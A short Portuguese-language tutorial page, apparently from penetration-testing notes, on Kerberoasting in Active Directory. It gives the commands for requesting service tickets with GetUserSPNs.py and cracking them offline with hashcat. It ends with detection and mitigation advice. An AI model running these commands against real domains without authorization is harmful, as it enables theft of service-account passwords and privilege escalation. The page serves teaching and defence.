---
title: Kerberoasting
description: Quebra offline de senhas de contas de serviço via tickets TGS.
order: 1
---

## O que é

Qualquer usuário autenticado no domínio pode pedir um ticket de serviço (TGS)
para contas que têm um **SPN**. Parte desse ticket é cifrada com a senha da conta
de serviço, então pode ser quebrada offline. Contas de serviço costumam ter
senhas antigas e privilégios altos.

## Exploração

Listar contas com SPN e pedir os tickets:

```bash
GetUserSPNs.py dominio.local/usuario:'Senha123' -dc-ip 10.0.0.10 \
  -request -outputfile kerberoast.txt
```

Quebrar com hashcat (modo `13100` para tickets RC4):

```bash
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule
```

> Tickets cifrados com AES usam os modos `19600` (AES128) e `19700` (AES256) e
> são muito mais lentos de quebrar.
{: .note }

## Detecção e mitigação

- Senhas longas e aleatórias (25+ caracteres) em contas de serviço, ou **gMSA**.
- Desabilitar RC4 e usar AES nas contas de serviço.
- Remover SPNs que não são usados e revisar privilégios dessas contas.
- Monitorar o evento **4769** com tipo de criptografia `0x17` (RC4).
